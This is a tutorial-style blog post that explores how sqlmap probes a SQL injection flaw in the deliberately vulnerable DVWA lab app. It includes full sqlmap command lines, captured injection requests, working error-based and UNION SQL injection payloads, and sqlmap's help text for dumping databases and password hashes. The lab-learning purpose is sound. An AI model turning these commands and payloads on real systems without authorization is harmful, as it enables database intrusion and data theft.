Title: What does sqlmap actually do?
Date: 2013-06-27
kind: article
Excerpt: Everyone knows that sqlmap is the tool of choice when you have identified SQL injection in a web app. And we can all agree that it's a little piece of magic. But what does it actually do?
Status: draft
Author: Felix Ingram
---
# Finding out what sqlmap actually does.

## Pressing go.

So you've found some SQL injection in your web app. But you want to do
something a little more showy than your usual proof of concept. But, y'know,
those can be little hard to remember. Plus there can be loads of typing
involved. So you bust out sqlmap, run it, check the help, add some command line
arguments, add some more, and then (if you're lucky) you'll get your
shell/meterpreter/DB dump/whatever. Magic.

But what the hell just happened? What if it didn't work? What if someone asked
you to do it again?

You could have a look at the code (it's only Python), and see what's happening
but, well, I tried that. See [what
happened](https://github.com/sqlmapproject/sqlmap/pull/53). If you've
a better/braver person than me then go wild.

## Bug hunting.

So let's ignore the code and see what it throws at an app. I'll using the [Damn
Vulnerable Web App](http://www.dvwa.co.uk/) on the [OWASP Broken Web
Applications Project](https://code.google.com/p/owaspbwa/) VM.

Log in and skip to the SQL Injection tab:
![SQL Injection tab](/images/dvwa_start_screen.png "Not my real username")

Let's bust it open with our not-at-all-racist test string:
![SQL Injection error](/images/dvwa_first_error.png "This is our world now. The world of the electron and the switch; the beauty of the baud. We exist without nationality, skin color, or religious bias. You wage wars, murder, cheat, lie to us and try to make us believe it's for our own good, yet we're the criminals. Yes, I am a criminal. My crime is that of curiosity. I am a hacker, and this is my manifesto. You may stop me, but you can't stop us all.")

Now we're cooking. Time to bust out the toolz!

`py -2 .\sqlmap.py --proxy=http://127.0.0.1:8080 -u "http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus&Submit=Submit#" --cookie="PHPSESSID=7utdbu8ujguekphdg426i7juk6"`

A little explanation: `py -2` because I'm on Windows, `.\sqlmap.py` because
PowerShell is awesome, `--proxy=http://127.0.0.1:8080` to pass everything through
Burp, and `-u
"http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus&Submit=Submit#"`
is the URL that we're attacking. We also pass in the `--cookie` option with the
`PHPSeSSID` from our authenticated session. If you don't supply the cookie then
the app will redirect us to the login screen and sqlmap will try and test that
URL instead.

*IMPORTANT*: the URL is being attacked through a `GET` request. Sqlmap will
attempt to find the injection point itself, so we're only passing in a basic
string, *not* one that breaks the app.

Hit go and we get:

    [19++]:> py -2 .\sqlmap.py --proxy=http://127.0.0.1:8080 -u
    "http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus&Submit=Submit#"
    --cookie="PHPSESSID=7utdbu8ujguekphdg426i7juk6"

        sqlmap/1.0-dev-991cafc - automatic SQL injection and database takeover
        tool
        http://sqlmap.org

    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior
    mutual consent is illegal. It is the end user's responsibility to obey all
    applicable local, state and federal laws. Developers assume no liability
    and are not responsible for any misuse or damage caused by this program

    [*] starting at 22:15:38

    [22:15:38] [INFO] testing connection to the target URL
    [22:15:38] [INFO] testing if the target URL is stable. This can take a couple of seconds
    [22:15:39] [INFO] target URL is stable
    [22:15:39] [INFO] testing if GET parameter 'id' is dynamic
    [22:15:39] [WARNING] GET parameter 'id' does not appear dynamic
    [22:15:39] [INFO] heuristics detected web page charset 'ascii'
    [22:15:39] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
    [22:15:39] [INFO] testing for SQL injection on GET parameter 'id' heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'.
    Do you want to skip test payloads specific for other DBMSes? [Y/n]

Sqlmap has detected that the app is running on MySQL (correct). But how did it
do that? Let's see what ended up in Burp. The following requests were made:

    http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus&Submit=Submit
    http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus&Submit=Submit
    http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=3776&Submit=Submit
    http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus%28%29%5D%5D%27%2C%5D%27.%28&Submit=Submit

The first two are the stabilty test. The third is the dynamic test. I'm
assuming it's looking for a different response from the app - in this case the
app doesn't respond differently if different user IDs are supplied. The fourth,
and final test, is the magic. The valid value (Shamus) has been padded with
`%28%29%5D%5D%27%2C%5D%27.%28`. Straight out of the
[textbook](http://www.amazon.co.uk/dp/1597499633). A quick trip through decoder
tells use that the string is `Shamus()]]',]'.(`.

![Another SQL Injection error](/images/dvwa_second_error.png "Remember, hacking is more than just a crime. It's a survival trait.")

Sqlmap has used the magic of heuristics to determine that we're running MySQL.
A quick look at the code shows that this is produced by `checkSqlInjection`,
which uses `getSortedInjectionTests`, which uses `conf.tests`, which is an
empty `AttribDict`. So we're none the wiser. Onwards!

    heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do
    you want to skip test payloads specific for other DBMSes? [Y/n] y
    do you want to include all tests for 'MySQL' extending provided level (1) and
    risk (1)? [Y/n]

Level 1 and risk 1 sounds about right, so we'll just hit go again. You will
want to page down a few times.

    [22:46:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
    [22:46:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
    [22:46:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
    [22:46:55] [INFO] testing 'MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)'
    [22:46:56] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
    [22:46:56] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
    [22:46:56] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
    [22:46:56] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace (original value)'
    [22:46:56] [INFO] testing 'MySQL < 5.0 boolean-based blind - Parameter replace (original value)'
    [22:46:56] [INFO] testing 'MySQL >= 5.0 boolean-based blind - GROUP BY and ORDER BY clauses'
    [22:46:56] [INFO] testing 'MySQL < 5.0 boolean-based blind - GROUP BY and ORDER BY clauses'
    [22:46:56] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'
    [22:46:56] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE or HAVING clause (EXTRACTVALUE)'
    [22:46:57] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE or HAVING clause (UPDATEXML)'
    [22:46:57] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE or HAVING clause'
    [22:46:57] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE or HAVING clause'
    [22:46:57] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE or HAVING clause (EXTRACTVALUE)'
    [22:46:57] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE or HAVING clause (UPDATEXML)'
    [22:46:57] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause'
    [22:46:58] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause'
    [22:46:58] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace'
    [22:46:58] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
    [22:46:58] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
    [22:46:58] [INFO] testing 'MySQL >= 5.0 error-based - GROUP BY and ORDER BY clauses'
    [22:46:58] [INFO] testing 'MySQL >= 5.1 error-based - GROUP BY and ORDER BY clauses (EXTRACTVALUE)'
    [22:46:58] [INFO] testing 'MySQL >= 5.1 error-based - GROUP BY and ORDER BY clauses (UPDATEXML)'
    [22:46:58] [INFO] testing 'MySQL inline queries'
    [22:46:58] [INFO] testing 'MySQL > 5.0.11 stacked queries'
    [22:46:58] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
    [22:46:58] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'
    [22:46:59] [INFO] testing 'MySQL > 5.0.11 AND time-based blind (comment)'
    [22:46:59] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query)'
    [22:46:59] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query - comment)'
    [22:46:59] [INFO] testing 'MySQL > 5.0.11 OR time-based blind'
    [22:46:59] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (heavy query)'
    [22:47:00] [INFO] testing 'MySQL >= 5.0 time-based blind - Parameter replace'
    [22:47:00] [INFO] testing 'MySQL < 5.0 time-based blind - Parameter replace (heavy queries)'
    [22:47:00] [INFO] testing 'MySQL time-based blind - Parameter replace (bool*int)'
    [22:47:00] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
    [22:47:00] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
    [22:47:00] [INFO] testing 'MySQL >= 5.0.11 time-based blind - GROUP BY and ORDER BY clauses'
    [22:47:00] [INFO] testing 'MySQL < 5.0.12 time-based blind - GROUP BY and ORDER BY clauses (heavy query)'
    [22:47:00] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
    [22:47:02] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
    [22:47:03] [INFO] testing 'MySQL UNION query (NULL) - 11 to 20 columns'
    [22:47:05] [INFO] testing 'MySQL UNION query (random number) - 11 to 20 columns'
    [22:47:06] [INFO] testing 'MySQL UNION query (NULL) - 21 to 30 columns'
    [22:47:08] [INFO] testing 'MySQL UNION query (random number) - 21 to 30 columns'
    [22:47:09] [INFO] testing 'MySQL UNION query (NULL) - 31 to 40 columns'
    [22:47:11] [INFO] testing 'MySQL UNION query (random number) - 31 to 40 columns'
    [22:47:12] [INFO] testing 'MySQL UNION query (NULL) - 41 to 50 columns'
    [22:47:14] [INFO] testing 'MySQL UNION query (random number) - 41 to 50 columns'
    [22:47:15] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
    [22:47:17] [WARNING] GET parameter 'id' is not injectable
    [22:47:17] [INFO] testing if GET parameter 'Submit' is dynamic
    [22:47:17] [WARNING] GET parameter 'Submit' does not appear dynamic
    [22:47:17] [WARNING] reflective value(s) found and filtering out
    [22:47:17] [WARNING] heuristic (basic) test shows that GET parameter 'Submit' might not be injectable
    [22:47:17] [INFO] testing for SQL injection on GET parameter 'Submit'
    [22:47:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
    [22:47:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
    [22:47:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
    [22:47:19] [INFO] testing 'MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)'
    [22:47:19] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
    [22:47:19] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
    [22:47:19] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
    [22:47:20] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace (original value)'
    [22:47:20] [INFO] testing 'MySQL < 5.0 boolean-based blind - Parameter replace (original value)'
    [22:47:20] [INFO] testing 'MySQL >= 5.0 boolean-based blind - GROUP BY and ORDER BY clauses'
    [22:47:20] [INFO] testing 'MySQL < 5.0 boolean-based blind - GROUP BY and ORDER BY clauses'
    [22:47:20] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'
    [22:47:20] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE or HAVING clause (EXTRACTVALUE)'
    [22:47:20] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE or HAVING clause (UPDATEXML)'
    [22:47:20] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE or HAVING clause'
    [22:47:21] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE or HAVING clause'
    [22:47:21] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE or HAVING clause (EXTRACTVALUE)'
    [22:47:21] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE or HAVING clause (UPDATEXML)'
    [22:47:21] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause'
    [22:47:21] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause'
    [22:47:22] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace'
    [22:47:22] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
    [22:47:22] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
    [22:47:22] [INFO] testing 'MySQL >= 5.0 error-based - GROUP BY and ORDER BY clauses'
    [22:47:22] [INFO] testing 'MySQL >= 5.1 error-based - GROUP BY and ORDER BY clauses (EXTRACTVALUE)'
    [22:47:22] [INFO] testing 'MySQL >= 5.1 error-based - GROUP BY and ORDER BY clauses (UPDATEXML)'
    [22:47:22] [INFO] testing 'MySQL inline queries'
    [22:47:22] [INFO] testing 'MySQL > 5.0.11 stacked queries'
    [22:47:22] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
    [22:47:22] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'
    [22:47:22] [INFO] testing 'MySQL > 5.0.11 AND time-based blind (comment)'
    [22:47:22] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query)'
    [22:47:23] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query - comment)'
    [22:47:23] [INFO] testing 'MySQL > 5.0.11 OR time-based blind'
    [22:47:23] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (heavy query)'
    [22:47:23] [INFO] testing 'MySQL >= 5.0 time-based blind - Parameter replace'
    [22:47:23] [INFO] testing 'MySQL < 5.0 time-based blind - Parameter replace (heavy queries)'
    [22:47:23] [INFO] testing 'MySQL time-based blind - Parameter replace (bool*int)'
    [22:47:23] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
    [22:47:23] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
    [22:47:23] [INFO] testing 'MySQL >= 5.0.11 time-based blind - GROUP BY and ORDER BY clauses'
    [22:47:23] [INFO] testing 'MySQL < 5.0.12 time-based blind - GROUP BY and ORDER BY clauses (heavy query)'
    [22:47:23] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
    [22:47:25] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
    [22:47:27] [INFO] testing 'MySQL UNION query (NULL) - 11 to 20 columns'
    [22:47:29] [INFO] testing 'MySQL UNION query (random number) - 11 to 20 columns'
    [22:47:30] [INFO] testing 'MySQL UNION query (NULL) - 21 to 30 columns'
    [22:47:32] [INFO] testing 'MySQL UNION query (random number) - 21 to 30 columns'
    [22:47:33] [INFO] testing 'MySQL UNION query (NULL) - 31 to 40 columns'
    [22:47:35] [INFO] testing 'MySQL UNION query (random number) - 31 to 40 columns'
    [22:47:36] [INFO] testing 'MySQL UNION query (NULL) - 41 to 50 columns'
    [22:47:38] [INFO] testing 'MySQL UNION query (random number) - 41 to 50 columns'
    [22:47:39] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
    [22:47:39] [WARNING] using unescaped version of the test because of zero
    knowledge of the back-end DBMS. You can try to explicitly set it using option '--dbms'
    [22:47:41] [WARNING] GET parameter 'Submit' is not injectable
    [22:47:41] [CRITICAL] all tested parameters appear to be not injectable.
    Try to increase '--level'/'--risk' values to perform more tests. Also, you
    can try to rerun by providing either a valid value for option '--string'
    (or '--regexp')

    [*] shutting down at 22:47:41

    C:\Users\Felix Ingram\Documents\development\sqlmap [master]
    [23++]:>

That's 119 lines of output. Let's see what went through Burp. Here's the first
request:

    http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus%29%20AND%201424
    %3D3074%20AND%20%284974%3D4974&Submit=Submit

Decoded version:

    http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus) AND 1424
    =3074 AND (4974=4974&Submit=Submit

Seems sensible.     

    http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus) AND 9178=9178 AND (3817=3817&Submit=Submit
    http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus) AND 8476=1778 AND (8681=8681&Submit=Submit
    http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus AND 3079=3387&Submit=Submit
    http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus AND 9178=9178&Submit=Submit
    http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus AND 8079=1538&Submit=Submit
    http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus') AND 6684=8259 AND ('SdOi'='SdOi&Submit=Submit

Looks like we're doing some blind true/false integer tests to start with and end up
with a 'false' string based tests. It then goes on with another 1570 requests
or so.

Wait. What?

Okay.

Wait. What?

1570 requests and all we get is: 

    [22:47:39] [WARNING] using unescaped version of the test because of zero
    knowledge of the back-end DBMS. You can try to explicitly set it using option '--dbms'
    [22:47:41] [WARNING] GET parameter 'Submit' is not injectable
    [22:47:41] [CRITICAL] all tested parameters appear to be not injectable.
    Try to increase '--level'/'--risk' values to perform more tests. Also, you
    can try to rerun by providing either a valid value for option '--string' (or '--regexp')

But didn't we start with:

    [22:15:39] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')

What went wrong? Let's check the code...

    > go north
    It is pitch black. You are likely to be eaten by a grue.

    > read code
    You have entered the Land of the Living Dead. Thousands of lost souls can be heard
    weeping and moaning. In the corner are stacked the remains of dozens of previous
    adventurers less fortunate than yourself. A passage exits to the north.  Lying in
    one corner of the room is a beautifully carved crystal skull. It appears to be
    grinning at you rather nastily.

Perhaps not then. Given that we're now committed to this, let's up the level or
risk. The `--help` text tells us:

    Detection:
        These options can be used to customize the detection phase

        --level=LEVEL       Level of tests to perform (1-5, default 1)
        --risk=RISK         Risk of tests to perform (0-3, default 1)

Bumping the level seems like a good start.

    [25++]:> py -2 .\sqlmap.py --proxy=http://127.0.0.1:8080 -u "http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus&Submit=Submit#"
    --cookie="PHPSESSID=7utdbu8ujguekphdg426i7juk6" --level=2

We bump the level up to 2. We get another 5801 requests. We end up with:

    [23:22:19] [WARNING] Cookie parameter 'PHPSESSID' is not injectable
    [23:22:19] [CRITICAL] all tested parameters appear to be not injectable.
    Try to increase '--level'/'--risk' values to perform more tests. Also, you
    can try to rerun by providing either a valid value for option '--string'
    (or '--regexp')

The WARNING tells us that sqlmap tested the PHPSESSID cookie, which actually
logged us out (not shown). Something isn't working, so let's see whether we can
give sqlmap some hints. Scanning the help text shows us that we can use the
`-p` option to provide a parameter and the `--dbms` option to tell it what
database is in use. We'll know what value to pass, as it. found. them. when.
we. first. ran. the. tool.

    [26++]:> py -2 .\sqlmap.py --proxy=http://127.0.0.1:8080 -u "http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus&Submit=Submit#"
    --cookie="PHPSESSID=7utdbu8ujguekphdg426i7juk6" -p id --dbms=mysql

Supplying the parameter and DB produces just 154 requests. But we still get our
CRITICAL error:

    [23:35:06] [CRITICAL] all tested parameters appear to be not injectable.  Try to increase
    '--level'/'--risk' values to perform more tests. As heuristic test turned out positive you are
    strongly advised to continue on with the tests. Please, consider usage of tampering scripts as
    your target might filter the queries. Also, you can try to rerun by providing either a valid
    value for option '--string' (or '--regexp')

Let's turn it up to 11:

    [29++]:> py -2 .\sqlmap.py --proxy=http://127.0.0.1:8080 -u "http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus&Submit=Submit#"
    --cookie="PHPSESSID=7utdbu8ujguekphdg426i7juk6" -p id --dbms=mysql
    --level=5 --risk=3

10,235 requests later:

    [23:54:02] [WARNING] GET parameter 'id' is not injectable
    [23:54:02] [CRITICAL] all tested parameters appear to be not injectable. As heuristic test
    turned out positive you are strongly advised to continue on with the tests. Please, consider
    usage of tampering scripts as your target might filter the queries. Also, you can try to rerun
    by providing either a valid value for option '--string' (or '--regexp')

So we're still not getting anywhere. Sqlmap does have a few more tricks up its
sleeve, however. One nice option is the ability to provide it with a raw
request from Burp (or similar) and have it work out everything from there.

    [3+]:> py -2 .\sqlmap.py -r .\SQLi_test_request --dbms=mysql -p id --proxy...

Still telling it the DB and parameter to look at, but let's see whether it gets
us any further.

    [4+]:> py -2 .\sqlmap.py -r .\SQLi_test_request --dbms=mysql -p id --proxy=http://127.0.0.1:8080 --banner

        sqlmap/1.0-dev-991cafc - automatic SQL injection and database takeover tool
        http://sqlmap.org

    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is
    illegal. It is the end user's responsibility to obey all applicable local, state and federal
    laws. Developers assume no liability and are not responsible for any misuse or damage caused by
    this program

    [*] starting at 13:37:57

    [13:37:57] [INFO] parsing HTTP request from '.\SQLi_test_request'
    [13:37:57] [INFO] testing connection to the target URL
    sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
    ---
    Place: GET
    Parameter: id
        Type: error-based
        Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
        Payload: id=Shamus' AND (SELECT 7874 FROM(SELECT COUNT(*),CONCAT(0x7170766f71,(SELECT (CASE
        WHEN (7874=7874) THEN 1 ELSE 0 END)),0x71747a6c71,FLOOR(RAND(0)*2))x FROM
        INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'eSMd'='eSMd&Submit=Submit

        Type: UNION query
        Title: MySQL UNION query (NULL) - 2 columns
        Payload: id=Shamus' UNION ALL SELECT NULL,CONCAT(0x7170766f71,0x72775441686f75625a6c,0x71747a6c71)#&Submit=Submit
    ---
    [13:37:57] [INFO] testing MySQL
    [13:37:57] [WARNING] reflective value(s) found and filtering out
    [13:37:57] [INFO] confirming MySQL
    [13:37:58] [INFO] the back-end DBMS is MySQL
    [13:37:58] [INFO] fetching banner
    web server operating system: Linux Ubuntu 10.04 (Lucid Lynx)
    web application technology: PHP 5.3.2, Apache 2.2.14
    back-end DBMS operating system: Linux Ubuntu
    back-end DBMS: MySQL >= 5.0.0
    banner:    '5.1.41-3ubuntu12.6-log'
    [13:37:58] [INFO] fetched data logged to text files under 'C:\Users\Felix Ingram\Documents\development\sqlmap\output\192.168.253.133'

    [*] shutting down at 13:37:58

Wait. What?

So when we pass in the request, we can grab the banner in only a handful of
requests. Let's try our original command again:

    [6+]:>  py -2 .\sqlmap.py --proxy=http://127.0.0.1:8080 -u "http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus&Submit=Submit#"
    -p id --dbms=mysql --cookie="PHPSESSID=mc2m3bbdca59a8k3vd81f7kqd1" --banner

    sqlmap/1.0-dev-991cafc - automatic SQL injection and database takeover tool
    http://sqlmap.org

    ... snip ...

    [14:01:41] [INFO] the back-end DBMS is MySQL
    [14:01:41] [INFO] fetching banner
    web server operating system: Linux Ubuntu 10.04 (Lucid Lynx)
    web application technology: PHP 5.3.2, Apache 2.2.14
    back-end DBMS operating system: Linux Ubuntu
    back-end DBMS: MySQL >= 5.0.0
    banner:    '5.1.41-3ubuntu12.6-log'

So we can retrieve things using the full command line version. One of the
reasons for this is that sqlmap remembers some state information between runs.
For the sake of experimenting, let's delete all of the cached information and
run things again:


    [7+]:> rm .\output\*

    Confirm
    The item at C:\Users\Felix Ingram\Documents\development\sqlmap\output\192.168.253.133 has
    children and the Recurse parameter was not specified. If you continue, all children will be
    removed with the item. Are you sure you want to continue?
    [Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "Y"): a

    C:\Users\Felix Ingram\Documents\development\sqlmap [master +1 ~0 -0 !]
    [8+]:>  py -2 .\sqlmap.py --proxy=http://127.0.0.1:8080 -u "http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus&Submit=Submit#"
    -p id --dbms=mysql --cookie="PHPSESSID=mc2m3bbdca59a8k3vd81f7kqd1" --banner

        sqlmap/1.0-dev-991cafc - automatic SQL injection and database takeover tool
        http://sqlmap.org

    ... snip ...

    [14:05:15] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
    [14:05:17] [WARNING] GET parameter 'id' is not injectable
    [14:05:17] [CRITICAL] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. As heuristic test turned out positive you are strongly advised to continue on with the tests. Please, consider usage of tampering scripts as your target might filter the queries. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp')

    [*] shutting down at 14:05:17

So normal service has been resumed. I posed this question to one of the
developers and got the rather cryptic hint that the `-r` option was added as
people weren't passing the correct options in on the command line. So let's see
what else we could be using.

    [9+]:> py -2 .\sqlmap.py -hh
    Usage: .\sqlmap.py [options]

    Options:
    -h, --help            Show basic help message and exit
    -hh                   Show advanced help message and exit
    --version             Show program's version number and exit
    -v VERBOSE            Verbosity level: 0-6 (default 1)

    Target:
        At least one of these options has to be provided to set the target(s)

        -d DIRECT           Direct connection to the database
        -u URL, --url=URL   Target URL (e.g. "www.target.com/vuln.php?id=1")
        -l LOGFILE          Parse targets from Burp or WebScarab proxy logs
        -m BULKFILE         Scan multiple targets enlisted in a given textual file
        -r REQUESTFILE      Load HTTP request from a file
        -g GOOGLEDORK       Process Google dork results as target URLs
        -c CONFIGFILE       Load options from a configuration INI file

    Request:
        These options can be used to specify how to connect to the target URL

        --data=DATA         Data string to be sent through POST
        --param-del=PDEL    Character used for splitting parameter values

None of those seem useful.

        --cookie=COOKIE     HTTP Cookie header

We're already using this one.

        --load-cookies=L..  File containing cookies in Netscape/wget format
        --drop-set-cookie   Ignore Set-Cookie header from response
        --user-agent=AGENT  HTTP User-Agent header
        --random-agent      Use randomly selected HTTP User-Agent header
        --host=HOST         HTTP Host header
        --referer=REFERER   HTTP Referer header
        --headers=HEADERS   Extra headers (e.g. "Accept-Language: fr\nETag: 123")
        --auth-type=ATYPE   HTTP authentication type (Basic, Digest, NTLM or Cert)
        --auth-cred=ACRED   HTTP authentication credentials (name:password)
        --auth-cert=ACERT   HTTP authentication certificate (key_file,cert_file)
        --proxy=PROXY       Use a HTTP proxy to connect to the target URL
        --proxy-cred=PCRED  HTTP proxy authentication credentials (name:password)
        --ignore-proxy      Ignore system default HTTP proxy
        --tor               Use Tor anonymity network
        --tor-port=TORPORT  Set Tor proxy port other than default
        --tor-type=TORTYPE  Set Tor proxy type (HTTP (default), SOCKS4 or SOCKS5)
        --check-tor         Check to see if Tor is used properly
        --delay=DELAY       Delay in seconds between each HTTP request
        --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
        --retries=RETRIES   Retries when the connection timeouts (default 3)
        --randomize=RPARAM  Randomly change value for given parameter(s)
        --safe-url=SAFURL   URL address to visit frequently during testing
        --safe-freq=SAFREQ  Test requests between two visits to a given safe URL
        --skip-urlencode    Skip URL encoding of payload data
        --force-ssl         Force usage of SSL/HTTPS
        --hpp               Use HTTP parameter pollution
        --eval=EVALCODE     Evaluate provided Python code before the request (e.g.
                            "import hashlib;id2=hashlib.md5(id).hexdigest()")

None of those seem applicable, unless we're using them already (i.e. --proxy).

    Optimization:
        These options can be used to optimize the performance of sqlmap

        -o                  Turn on all optimization switches
        --predict-output    Predict common queries output
        --keep-alive        Use persistent HTTP(s) connections
        --null-connection   Retrieve page length without actual HTTP response body
        --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)

Nope.

    Injection:
        These options can be used to specify which parameters to test for,
        provide custom injection payloads and optional tampering scripts

        -p TESTPARAMETER    Testable parameter(s)

Yep.

        --skip=SKIP         Skip testing for given parameter(s)

Maybe.

        --dbms=DBMS         Force back-end DBMS to this value

Yep.

        --dbms-cred=DBMS..  DBMS authentication credentials (user:password)
        --os=OS             Force back-end DBMS operating system to this value

Maybe.

        --invalid-bignum    Use big numbers for invalidating values
        --invalid-logical   Use logical operations for invalidating values
        --no-cast           Turn off payload casting mechanism

Maybe.

        --no-escape         Turn off string escaping mechanism

Maybe.

        --prefix=PREFIX     Injection payload prefix string
        --suffix=SUFFIX     Injection payload suffix string
        --tamper=TAMPER     Use given script(s) for tampering injection data

    Detection:
        These options can be used to customize the detection phase

        --level=LEVEL       Level of tests to perform (1-5, default 1)
        --risk=RISK         Risk of tests to perform (0-3, default 1)
        --string=STRING     String to match when query is evaluated to True
        --not-string=NOT..  String to match when query is evaluated to False
        --regexp=REGEXP     Regexp to match when query is evaluated to True
        --code=CODE         HTTP code to match when query is evaluated to True
        --text-only         Compare pages based only on the textual content
        --titles            Compare pages based only on their titles

    Techniques:
        These options can be used to tweak testing of specific SQL injection
        techniques

        --technique=TECH    SQL injection techniques to use (default "BEUSTQ")
        --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
        --union-cols=UCOLS  Range of columns to test for UNION query SQL injection
        --union-char=UCHAR  Character to use for bruteforcing number of columns
        --union-from=UFROM  Table to use in FROM part of UNION query SQL injection
        --dns-domain=DNS..  Domain name used for DNS exfiltration attack
        --second-order=S..  Resulting page URL searched for second-order response

    Fingerprint:
        -f, --fingerprint   Perform an extensive DBMS version fingerprint

    Enumeration:
        These options can be used to enumerate the back-end database
        management system information, structure and data contained in the
        tables. Moreover you can run your own SQL statements

        -a, --all           Retrieve everything
        -b, --banner        Retrieve DBMS banner
        --current-user      Retrieve DBMS current user
        --current-db        Retrieve DBMS current database
        --hostname          Retrieve DBMS server hostname
        --is-dba            Detect if the DBMS current user is DBA
        --users             Enumerate DBMS users
        --passwords         Enumerate DBMS users password hashes
        --privileges        Enumerate DBMS users privileges
        --roles             Enumerate DBMS users roles
        --dbs               Enumerate DBMS databases
        --tables            Enumerate DBMS database tables
        --columns           Enumerate DBMS database table columns
        --schema            Enumerate DBMS schema
        --count             Retrieve number of entries for table(s)
        --dump              Dump DBMS database table entries
        --dump-all          Dump all DBMS databases tables entries
